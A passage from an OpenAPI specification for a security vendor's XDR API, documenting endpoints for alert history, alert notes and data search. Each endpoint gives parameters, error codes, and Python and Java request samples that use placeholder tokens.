.build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/workbench/workbenchHistories": {
      "get": {
        "summary": "Get detailed alert history",
        "description": "Retrieves information about Workbench alerts that match specified criteria and displays the information in a paginated list\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Workbench</b><br>\n  <ul>\n    <li>View, filter, and search</li>\n  </ul>\n\n</div>\n",
        "tags": [
          "Alerts"
        ],
        "parameters": [
          {
            "name": "startTime",
            "description": "Timestamp in ISO 8601 format indicating the start of the data retrieval time range.",
            "example": "2020-06-15T10:00:00.000Z",
            "in": "query",
            "required": true,
            "schema": {
              "type": "string"
            }
          },
          {
            "name": "endTime",
            "description": "Timestamp in ISO 8601 format indicating the end of the data retrieval time range. Ensure that \"endTime\" is not earlier than \"startTime\".",
            "example": "2020-06-15T12:00:00.000Z",
            "in": "query",
            "required": true,
            "schema": {
              "type": "string"
            }
          },
          {
            "name": "investigationStatus",
            "deprecated": true,
            "description": "The current status of the alert or investigation triggered in Workbench. You can specify multiple statuses separated by commas.\nAvailable statuses: * `0` - New * `1` - In Progress * `2` - Resolved: True Positive * `3` - Resolved: False Positive * `4` - Resolved: Benign True Positive * `5` - Resolved\nDefault: All\n",
            "in": "query",
            "example": "0,1",
            "schema": {
              "type": "string"
            }
          },
          {
            "name": "status",
            "description": "The status of a case or investigation opened from Workbench. You can specify multiple values separated by commas.\nAvailable values: * `1` - Open * `2` - In progress * `3` - Closed\nDefault: All\n",
            "in": "query",
            "example": "1,2",
            "schema": {
              "type": "string"
            }
          },
          {
            "name": "investigationResult",
            "description": "The findings of a case or investigation opened from Workbench. \nYou can specify multiple values separated by commas.\nAvailable results: * `0` - No findings * `1` - Noteworthy * `2` - True positive * `3` - False positive * `4` - Benign true positive * `5` - Other findings\nDefault: All\n",
            "in": "query",
            "example": "0,1",
            "schema": {
              "type": "string"
            }
          },
          {
            "name": "sortBy",
            "description": "Specifies the field by which the results are sorted.\n\nData is displayed in ascending order by default. To display records in descending order, prepend a hyphen (-) before the parameter name.\n\nAvailable values:\n  * `investigationStatus` (deprecated)\n  * `status`\n  * `investigationResult`\n  * `score`\n  * `wbName`\n  * `wbId`\n  * `caseId`\n  * `createdTime`\n  * `severity`\n  * `modelId`\n",
            "example": "-createdTime",
            "in": "query",
            "required": true,
            "schema": {
              "type": "string",
              "enum": [
                "investigationStatus",
                "status",
                "investigationResult",
                "score",
                "wbName",
                "wbId",
                "caseId",
                "createdTime",
                "severity",
                "modelId",
                "-investigationStatus",
                "-status",
                "-investigationResult",
                "-score",
                "-wbName",
                "-wbId",
                "-caseId",
                "-createdTime",
                "-severity",
                "-modelId"
              ]
            }
          },
          {
            "name": "queryTimeField",
            "description": "The timestamp used for retrieving Workbench alert data.\n\nDefault: `createdTime`\n",
            "example": "createdTime",
            "in": "query",
            "schema": {
              "type": "string",
              "enum": [
                "updatedTime",
                "createdTime"
              ]
            }
          },
          {
            "name": "searchBy",
            "description": "The target field for keyword searches. \nUse both 'searchBy' and 'keyword' in combination for best results.\nPossible values:\n  * `impactScope` - Search for specific endpoint names, user accounts, email addresses, container names or cloud resource names\n  * `highlightedObjects` - Search for specific objects that triggered a detection filter\n",
            "schema": {
              "type": "string",
              "enum": [
                "impactScope",
                "highlightedObjects"
              ]
            },
            "example": "highlightedObjects",
            "in": "query"
          },
          {
            "name": "keyword",
            "description": "The keyword used to search for Workbench alerts. \n\nKeywords can be up to 300 characters long. Keywords containing special characters must use percent-encoding.\n\nNote: The API supports partial match search.\n",
            "schema": {
              "type": "string",
              "minLength": 1,
              "maxLength": 300
            },
            "example": "document.lnk",
            "in": "query"
          },
          {
            "name": "modelType",
            "description": "The type of detection model that triggered the alert. \nThe default value is `all`.\nPossible values:\n  * `all` - Search both custom and non custom alerts\n  * `preset` - Only search preset alerts\n  * `custom` - Only search custom alerts\n",
            "example": "all",
            "in": "query",
            "schema": {
              "type": "string",
              "enum": [
                "all",
                "preset",
                "custom"
              ]
            }
          },
          {
            "name": "offset",
            "description": "Position of a particular record in the dataset. \n\nNote: `0` refers to the first record.\n",
            "example": "0",
            "in": "query",
            "required": true,
            "schema": {
              "type": "integer",
              "minimum": 0
            }
          },
          {
            "name": "limit",
            "description": "The number of records displayed on a page. <br>\nThe maximum allowed value is 500.\n",
            "example": 100,
            "in": "query",
            "required": true,
            "schema": {
              "type": "integer",
              "minimum": 1,
              "maximum": 500
            }
          },
          {
            "name": "TMV1-Custom-Tag-Filter",
            "description": "The custom tag filer for retrieving a list of Workbench alerts\n\nSupported fields:\n* `key` - The key of the custom asset tag\n* `value` - The value of the custom asset tag\n\nSupported operators:\n* `eq` - Abbreviation of the operator 'equal to'\n* `and` - Operator 'and'\n* `or` - Operator 'or'\n* `( )` - Symbols for grouping operands with their correct operator.\n\n> **Note:**\n>\n> * Each statement must include a key/value pair. You can combine multiple statements using `or`.\n> * Include this parameter in every request that generates paginated output.\n",
            "in": "header",
            "schema": {
              "type": "string",
              "maxLength": 5000
            },
            "example": "(key eq 'Department' and value eq 'finance') or (key eq 'Department' and value eq 'engineer')"
          },
          {
            "name": "TMV1-Platform-Tag-Filter",
            "description": "The platform tag filter for retrieving a list of Workbench alerts. \n\nSupported fields:\n* key - The key of the platform tags\n* value - The value of the platform tags\n\nSupported operators:\n* `eq` - Abbreviation of the operator 'equal to'\n* `and` - Operator 'and'\n* `or` - Operator 'or'\n* `( )` - Symbols for grouping operands with their correct operator.\n\n> **Note:**\n>\n> * Each statement must include a key/value pair. You can combine multiple statements using `or`.\n> * Include this parameter in every request that generates paginated output.\n",
            "in": "header",
            "schema": {
              "type": "string",
              "maxLength": 5000
            },
            "example": "(key eq 'Asset group' and value eq 'us') or (key eq 'Asset group' and value eq 'us')"
          }
        ],
        "responses": {
          "200": {
            "description": "OK",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/awb-WorkbenchHistoryV2Details"
                },
                "examples": {
                  "saeWorkbenchDetailsExample": {
                    "$ref": "#/components/examples/awb-WorkbenchHistoryV2SAEDetailsExample"
                  },
                  "tiWorkbenchDetailsExample": {
                    "$ref": "#/components/examples/awb-WorkbenchHistoryV2TIDetailsExample"
                  }
                }
              }
            }
          },
          "400": {
            "content": {
              "application/json": {
                "schema": {
                  "properties": {
                    "error": {
                      "type": "object",
                      "description": "* 3090003 - Unable to process the request. Verify that the request is properly formatted and try again. (Error code: 3090003)\n* 3008001 - Unable to retrieve workbench summary information. Verify that the request is properly formatted and try again. (Error code: 3008001)\n* 3008002 - Unable to retrieve workbench summary information. Verify that the specified company exists and that you have permission to access the company's data and try again. (Error code: 3008002)\n",
                      "properties": {
                        "code": {
                          "type": "string",
                          "example": "3008001",
                          "enum": [
                            "3090003",
                            "3008001",
                            "3008002"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "Unable to retrieve workbench summary information. Verify that the request is properly formatted and try again. (Error code: 3008001)"
                        },
                        "innererror": {
                          "type": "object",
                          "properties": {
                            "code": {
                              "type": "string",
                              "example": ""
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "413": {
            "content": {
              "application/json": {
                "schema": {
                  "properties": {
                    "error": {
                      "type": "object",
                      "description": "* 3008413 - Unable to retrieve workbench overview and details. The query returned a large number of results. Refine the query filters and try again. (Error code: 3008413)\n",
                      "properties": {
                        "code": {
                          "type": "string",
                          "example": "3008413",
                          "enum": [
                            "3008413"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "Unable to retrieve workbench overview and details. The query returned a large number of results. Refine the query filters and try again. (Error code: 3008413)"
                        },
                        "innererror": {
                          "type": "object",
                          "properties": {
                            "code": {
                              "type": "string",
                              "example": ""
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "content": {
              "application/json": {
                "schema": {
                  "properties": {
                    "error": {
                      "type": "object",
                      "description": "* 3008999: Unable to retrieve workbench summary information. An internal error has occurred. Please try again later. If the issue persists, contact Trend Micro Support. (Error code: 3008999)\n",
                      "properties": {
                        "code": {
                          "type": "string",
                          "example": "3008999",
                          "enum": [
                            "3008999"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "Unable to retrieve workbench summary information. An internal error has occurred. Please try again later. If the issue persists, contact Trend Micro Support. (Error code: 3008999)"
                        },
                        "innererror": {
                          "type": "object",
                          "properties": {
                            "code": {
                              "type": "string",
                              "example": ""
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/workbench/workbenchHistories'\ntoken = 'YOUR_TOKEN'\n\nquery_params = {\n    'startTime': 'YOUR_STARTTIME (string)',\n    'endTime': 'YOUR_ENDTIME (string)',\n    'status': 'YOUR_STATUS (string)',\n    'investigationResult': 'YOUR_INVESTIGATIONRESULT (string)',\n    'sortBy': 'YOUR_SORTBY (string)',\n    'queryTimeField': 'YOUR_QUERYTIMEFIELD (string)',\n    'searchBy': 'YOUR_SEARCHBY (string)',\n    'keyword': 'YOUR_KEYWORD (string)',\n    'modelType': 'YOUR_MODELTYPE (string)',\n    'offset': 'YOUR_OFFSET (integer)',\n    'limit': 'YOUR_LIMIT (integer)'\n}\nheaders = {\n    'Authorization': 'Bearer ' + token,\n    'TMV1-Custom-Tag-Filter': 'YOUR_CUSTOM-TAG-FILTER (string)',\n    'TMV1-Platform-Tag-Filter': 'YOUR_PLATFORM-TAG-FILTER (string)'\n}\n\nr = requests.get(url_base + url_path, params=query_params, headers=headers)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/workbench/workbenchHistories\";\n        String token = \"YOUR_TOKEN\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.get(urlBase + urlPath)\n                .addParameter(\"startTime\", \"YOUR_STARTTIME (string)\")\n                .addParameter(\"endTime\", \"YOUR_ENDTIME (string)\")\n                .addParameter(\"status\", \"YOUR_STATUS (string)\")\n                .addParameter(\"investigationResult\", \"YOUR_INVESTIGATIONRESULT (string)\")\n                .addParameter(\"sortBy\", \"YOUR_SORTBY (string)\")\n                .addParameter(\"queryTimeField\", \"YOUR_QUERYTIMEFIELD (string)\")\n                .addParameter(\"searchBy\", \"YOUR_SEARCHBY (string)\")\n                .addParameter(\"keyword\", \"YOUR_KEYWORD (string)\")\n                .addParameter(\"modelType\", \"YOUR_MODELTYPE (string)\")\n                .addParameter(\"offset\", \"YOUR_OFFSET (integer)\")\n                .addParameter(\"limit\", \"YOUR_LIMIT (integer)\")\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .addHeader(\"TMV1-Custom-Tag-Filter\", \"YOUR_CUSTOM-TAG-FILTER (string)\")\n                .addHeader(\"TMV1-Platform-Tag-Filter\", \"YOUR_PLATFORM-TAG-FILTER (string)\")\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/workbench/workbenches/{workbenchId}/notes": {
      "get": {
        "summary": "Get alert notes",
        "description": "Retrieves notes of the specified alert\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Workbench</b><br>\n  <ul>\n    <li>View, filter, and search</li>\n  </ul>\n\n</div>\n",
        "tags": [
          "Notes"
        ],
        "parameters": [
          {
            "name": "workbenchId",
            "description": "Workbench ID",
            "example": "WB-14-20190709-00003",
            "in": "path",
            "required": true,
            "schema": {
              "type": "string"
            }
          }
        ],
        "responses": {
          "200": {
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "properties": {
                    "info": {
                      "description": "* 3022000 - Alert notes listed successfully.\n",
                      "type": "object",
                      "properties": {
                        "code": {
                          "description": "code",
                          "type": "integer",
                          "example": 3022000,
                          "enum": [
                            3022000
                          ]
                        },
                        "msg": {
                          "description": "msg",
                          "type": "string",
                          "example": "Alert notes listed successfully."
                        }
                      }
                    },
                    "data": {
                      "type": "object",
                      "properties": {
                        "notes": {
                          "type": "array",
                          "items": {
                            "type": "object",
                            "properties": {
                              "id": {
                                "type": "integer",
                                "example": 1
                              },
                              "content": {
                                "type": "string",
                                "example": "It is a note"
                              },
                              "creatorId": {
                                "type": "string",
                                "nullable": true,
                                "example": "john_doe@xdr.com"
                              },
                              "creatorName": {
                                "type": "string",
                                "example": "John Doe"
                              },
                              "createdTimestamp": {
                                "type": "string",
                                "example": "2020-11-11T15:10:08.000Z"
                              },
                              "lastUpdatedBy": {
                                "type": "string",
                                "nullable": true,
                                "example": "John Doe"
                              },
                              "lastUpdatedTimestamp": {
                                "type": "string",
                                "nullable": true,
                                "example": "2020-11-11T15:10:08.000Z"
                              }
                            }
                          },
                          "example": [
                            {
                              "id": 2,
                              "content": "test note 2",
                              "creatorId": "john_doe@xdr.com",
                              "creatorName": "John Doe",
                              "createdTimestamp": "2020-11-12T10:30:13Z",
                              "lastUpdatedBy": null,
                              "lastUpdatedTimestamp": null
                            },
                            {
                              "id": 1,
                              "content": "test note 1",
                              "creatorId": "john_doe@xdr.com",
                              "creatorName": "John Doe",
                              "createdTimestamp": "2020-11-11T15:10:08Z",
                              "lastUpdatedBy": "John Doe",
                              "lastUpdatedTimestamp": "2020-11-11T15:15:21Z"
                            }
                          ]
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "400": {
            "$ref": "#/components/responses/awb-CommonErrors400"
          },
          "403": {
            "$ref": "#/components/responses/awb-CommonErrors403"
          },
          "404": {
            "$ref": "#/components/responses/awb-CommonErrors404"
          },
          "500": {
            "$ref": "#/components/responses/awb-CommonErrors500"
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/workbench/workbenches/{workbenchId}/notes'\nurl_path = url_path.format(**{'workbenchId': 'YOUR_WORKBENCHID'})\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token\n}\n\nr = requests.get(url_base + url_path, params=query_params, headers=headers)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/workbench/workbenches/{workbenchId}/notes\";\n        urlPath = urlPath.replace(\"{workbenchId}\", \"YOUR_WORKBENCHID\");\n        String token = \"YOUR_TOKEN\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.get(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      },
      "post": {
        "summary": "Add alert note",
        "description": "Adds a note to the specified alert\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Workbench</b><br>\n  <ul>\n    <li>Modify alert details</li>\n  </ul>\n\n</div>\n",
        "tags": [
          "Notes"
        ],
        "parameters": [
          {
            "name": "workbenchId",
            "description": "Workbench ID",
            "example": "WB-14-20190709-00003",
            "in": "path",
            "required": true,
            "schema": {
              "type": "string"
            }
          }
        ],
        "requestBody": {
          "required": true,
          "content": {
            "application/json": {
              "schema": {
                "type": "object",
                "properties": {
                  "content": {
                    "type": "string",
                    "description": "Note content",
                    "example": "It is a note."
                  }
                }
              }
            }
          }
        },
        "responses": {
          "200": {
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "properties": {
                    "info": {
                      "description": "* 3021000 - Alert notes added successfully.\n",
                      "type": "object",
                      "properties": {
                        "code": {
                          "description": "code",
                          "type": "integer",
                          "example": 3021000,
                          "enum": [
                            3021000
                          ]
                        },
                        "msg": {
                          "description": "msg",
                          "type": "string",
                          "example": "Alert notes added successfully."
                        }
                      }
                    },
                    "data": {
                      "type": "object",
                      "properties": {
                        "id": {
                          "type": "integer",
                          "description": "Note ID",
                          "example": 123
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "400": {
            "$ref": "#/components/responses/awb-CommonErrors400"
          },
          "403": {
            "$ref": "#/components/responses/awb-CommonErrors403"
          },
          "404": {
            "$ref": "#/components/responses/awb-CommonErrors404"
          },
          "500": {
            "$ref": "#/components/responses/awb-CommonErrors500"
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/workbench/workbenches/{workbenchId}/notes'\nurl_path = url_path.format(**{'workbenchId': 'YOUR_WORKBENCHID'})\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token,\n    'Content-Type': 'application/json;charset=utf-8'\n}\nbody = {\n    'content': 'YOUR_CONTENT (string)'\n}\n\nr = requests.post(url_base + url_path, params=query_params, headers=headers, json=body)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/workbench/workbenches/{workbenchId}/notes\";\n        urlPath = urlPath.replace(\"{workbenchId}\", \"YOUR_WORKBENCHID\");\n        String token = \"YOUR_TOKEN\";\n\n        String requestyBody = \n                \"{\" +\n                \"    \\\"content\\\": \\\"YOUR_CONTENT (string)\\\"\" +\n                \"}\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.post(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .addHeader(\"Content-Type\", \"application/json;charset=utf-8\")\n                .setEntity(requestyBody, ContentType.APPLICATION_JSON)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      },
      "delete": {
        "summary": "Delete alert note",
        "description": "Deletes a note from the specified alert\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Workbench</b><br>\n  <ul>\n    <li>Modify alert details</li>\n  </ul>\n\n</div>\n",
        "tags": [
          "Notes"
        ],
        "parameters": [
          {
            "name": "workbenchId",
            "description": "Workbench ID",
            "example": "WB-14-20190709-00003",
            "in": "path",
            "required": true,
            "schema": {
              "type": "string"
            }
          },
          {
            "name": "ids",
            "in": "query",
            "description": "Note IDs, use common-separated if more than one ID",
            "example": 123,
            "required": true,
            "schema": {
              "type": "integer"
            }
          }
        ],
        "responses": {
          "200": {
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "properties": {
                    "info": {
                      "description": "* 3023000 - Alert notes deleted successfully.\n",
                      "type": "object",
                      "properties": {
                        "code": {
                          "description": "code",
                          "type": "integer",
                          "example": 3023000,
                          "enum": [
                            3023000
                          ]
                        },
                        "msg": {
                          "description": "msg",
                          "type": "string",
                          "example": "Alert notes deleted successfully."
                        }
                      }
                    },
                    "data": {
                      "type": "object",
                      "nullable": true,
                      "properties": {
                        "ids": {
                          "type": "array",
                          "description": "Deleted note IDs",
                          "items": {
                            "type": "integer",
                            "example": 123
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "400": {
            "$ref": "#/components/responses/awb-CommonErrors400"
          },
          "403": {
            "$ref": "#/components/responses/awb-CommonErrors403"
          },
          "404": {
            "$ref": "#/components/responses/awb-CommonErrors404"
          },
          "500": {
            "$ref": "#/components/responses/awb-CommonErrors500"
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/workbench/workbenches/{workbenchId}/notes'\nurl_path = url_path.format(**{'workbenchId': 'YOUR_WORKBENCHID'})\ntoken = 'YOUR_TOKEN'\n\nquery_params = {\n    'ids': 'YOUR_IDS (integer)'\n}\nheaders = {\n    'Authorization': 'Bearer ' + token\n}\n\nr = requests.delete(url_base + url_path, params=query_params, headers=headers)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/workbench/workbenches/{workbenchId}/notes\";\n        urlPath = urlPath.replace(\"{workbenchId}\", \"YOUR_WORKBENCHID\");\n        String token = \"YOUR_TOKEN\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.delete(urlBase + urlPath)\n                .addParameter(\"ids\", \"YOUR_IDS (integer)\")\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/search/data": {
      "post": {
        "tags": [
          "Search"
        ],
        "summary": "Search for data and list all results",
        "description": "Searches data sources using specified query criteria and retrieves a paginated list of matching records\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Search</b><br>\n  <ul>\n    <li>View, filter, and search</li>\n  </ul>\n\n</div>\n",
        "parameters": [],
        "requestBody": {
          "description": "Search Data",
          "content": {
            "application/json": {
              "schema": {
                "required": [
                  "from",
                  "to",
                  "source",
                  "query"
